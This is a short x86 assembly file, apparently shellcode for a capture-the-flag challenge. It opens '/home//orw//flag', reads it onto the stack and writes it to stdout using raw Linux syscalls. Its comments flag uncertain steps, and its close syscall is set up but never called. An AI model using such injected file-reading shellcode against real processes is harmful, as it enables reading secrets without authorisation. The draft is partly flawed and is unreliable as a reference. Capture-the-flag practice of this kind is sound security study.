section .text

global _start

_start:
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

;sys_open(file, flags)
;set file
push eax
push 0x67616c66
push 0x2f2f7772
push 0x6f2f2f65
push 0x6d6f682f
mov ebx, esp

mov al, 0x5
int 0x80

;file descriptor is in eax

;sys_read(fd, input, size)
;set fd
mov ebx, eax
;set storage buffer (probably wrong)
mov ecx, esp
;set count (unknown)
mov dl, 0x64

mov al, 0x3
int 0x80

;sys_close(fd)
mov al, 6

;sys_write(fd, input, size)
;set fd
mov bl, 0x1

mov al, 0x4
int 0x80
